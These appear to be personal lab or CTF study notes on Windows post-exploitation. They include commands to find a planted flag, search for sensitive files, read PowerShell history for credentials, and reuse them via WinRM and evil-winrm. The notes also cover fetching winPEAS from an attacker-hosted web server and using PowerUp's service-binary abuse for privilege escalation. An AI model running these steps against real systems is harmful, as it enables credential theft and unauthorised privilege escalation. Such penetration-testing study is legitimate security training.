https://superuser.com/questions/768984/show-exe-file-path-of-running-processes-on-the-command-line-in-windows
```

PS C:\Users\mac> Get-Process NonStandardProcess

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
     79       8    11912       1608       6.14   1792   0 NonStandardProcess


PS C:\Users\mac> Get-Process NonStandardProcess | Format-List Path


Path : C:\Users\mac\AppData\Roaming\SuperCompany\NonStandardProcess.exe



PS C:\Users\mac> cd C:\Users\mac\AppData\Roaming\SuperCompany
PS C:\Users\mac\AppData\Roaming\SuperCompany> dir


    Directory: C:\Users\mac\AppData\Roaming\SuperCompany


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/16/2026  12:22 PM             38 flag.txt
-a----        11/15/2022   8:32 AM        1323008 NonStandardProcess.exe


PS C:\Users\mac\AppData\Roaming\SuperCompany> type flag.txt
OS{dbf6f787909a715d9d1a4767fc7a2a89}
PS C:\Users\mac\AppData\Roaming\SuperCompany>

```

Get noteworthy files:
`Get-ChildItem -Path C:\Users\ -Include *.ini,*.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue` 

## Find Powershell History
```powershell
Get-History
```
If not cleared this will output last commands executed in the current PowerShell session. To find the history of commands executed in previous sessions, you can check the PowerShell history file, which is typically located at:
```powershell
(Get-PSReadlineOption).HistorySavePath
```

Wich you can read with:
```powershell
Get-Content (Get-PSReadlineOption).HistorySavePath
```

### Creds in PowerShell History
If you find any credentials in the PowerShell history, you can use them to escalate privileges
Example what you'll find in the history:

```powershell
$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
```

This is also called powershell remoting, which allows you to run commands on a remote machine. If you have the credentials, you can use them to access the remote machine and potentially escalate privileges.

Linux tool for it is called `evil-winrm`, which allows you to connect to a Windows machine using the WinRM protocol. You can use it to execute commands on the remote machine and potentially escalate privileges if you have valid credentials.
```bash
evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
```

## Windows Enumeration WinPEAS
WinPEAS is a script that enumerates common Windows privilege escalation vectors. It can be run on a Windows machine to gather information about the system, installed software, services, and potential misconfigurations that could be exploited for privilege escalation.
```bash
cp /usr/share/peass/winpeas/winPEASx64.exe .
python3 -m http.server 80
```

### Copy it to your target machine and run it:
```powershell
iwr -uri http://192.168.48.3/winPEASx64.exe -Outfile winPEAS.exe
```
```powershell
.\winPEAS.exe
```

WinPeas will output a lot of information, including potential privilege escalation vectors, such as weak permissions, unquoted service paths, and more.

Other options for Windows enumeration include
PowerUp, but it is not maintained anymore. You can find it here:
https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc

## Privesc Windows
Use PowerUp to find potential privilege escalation vectors on Windows systems. 

```powershell
iwr -uri https://github.com/PowerShellMafia/PowerSploit/raw/refs/heads/master/Privesc/PowerUp.ps1 -Outfile PowerUp.ps1
```
Import the PowerUp module and run the enumeration functions to identify misconfigurations and vulnerabilities that could be exploited for privilege escalation.

```powershell
. .\PowerUp.ps1
```
Get a list of all services and their properties, including the binary path, to identify potential misconfigurations.
```powershell
Get-ModifiableServiceFile    
```
PowerUp will also suggest potential privilege escalation vectors based on the findings.
```powershell
Install-ServiceBinary -Name LaDEEDah
```


## Run application as a specific user using `runas` command
The `runas` command allows you to run a program as a different user. 

```powershell
runas /user:Administrator "C:\Path\To\Application.exe"
```